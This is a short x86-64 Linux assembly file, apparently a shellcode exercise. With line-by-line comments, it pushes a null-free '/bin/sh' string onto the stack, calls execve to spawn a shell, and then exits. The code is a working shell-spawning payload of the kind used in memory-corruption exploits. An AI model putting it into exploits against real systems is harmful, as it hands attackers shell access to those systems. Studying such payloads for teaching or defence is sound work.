global _start
section .text

_start:

	xor rsi, rsi
	mul rsi		; clear rax and rdx

	mov rbx, 0x68732f6e69622fff

	shr rbx, 0x8	; "/bin/sh\0"
	push rbx

	mov rdi, rsp	; rdi points at the top of the stack, where is the string

	mov al, 0x3b	; 3b is the hex value of the decimal 59 for execve 
	syscall		; exec execve syscall

	xchg rdi, rax	; put return value in rdi

	push 0x3c
	pop rax		; 3c is the hex value of the decimal 60 for exit
	
	syscall		; exec exit syscall
